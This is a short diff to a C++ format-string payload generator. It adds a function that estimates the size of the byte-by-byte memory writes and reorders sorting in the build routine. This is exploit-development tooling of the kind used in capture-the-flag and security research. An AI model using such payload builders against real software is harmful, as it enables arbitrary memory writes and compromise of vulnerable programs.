@@ -45,18 +45,39 @@ uint64_t &fmtstr_payload::operator[](uint64_t addr) {
     return this->writes[addr];
 }
 
+uint64_t fmtstr_payload::get_write_size() {
+    size_t payload_size = 0;
+    uint64_t written = this->bytes_written + this->padding;
+    for(auto iter : this->list) {
+        uint64_t value = iter.second;
+        if(value == (written & 0xff)) {
+            payload_size += 7;
+            continue;
+        }
+        uint64_t write_size = (value - written) & 0xff;
+        if(write_size < 10)
+            payload_size += 10;
+        else if(write_size < 100)
+            payload_size += 11;
+        else
+            payload_size += 12;
+        written += write_size;
+    }
+    return payload_size;
+}
+
 std::string fmtstr_payload::build() {
     for(auto x : this->writes)
         this->do_write(x.first, x.second);
-
+ 
+    std::sort(this->list.begin(), this->list.end(), sortcmp);
     std::string payload;
     uint64_t written = this->bytes_written + this->padding;
-    uint64_t payload_size = this->list.size() * 12;
-    payload_size = payload_size + 0x10 - (payload_size % 8);
 
+    uint64_t payload_size = this->get_write_size();
+    payload_size = payload_size + 8 - (payload_size % 8);
     uint64_t pos = this->offset + (written + payload_size)/8;
-    std::sort(this->list.begin(), this->list.end(), sortcmp);
-
+    
     for(auto iter : this->list) {
         uint64_t value = iter.second;
         if(value != (written & 0xff)) {
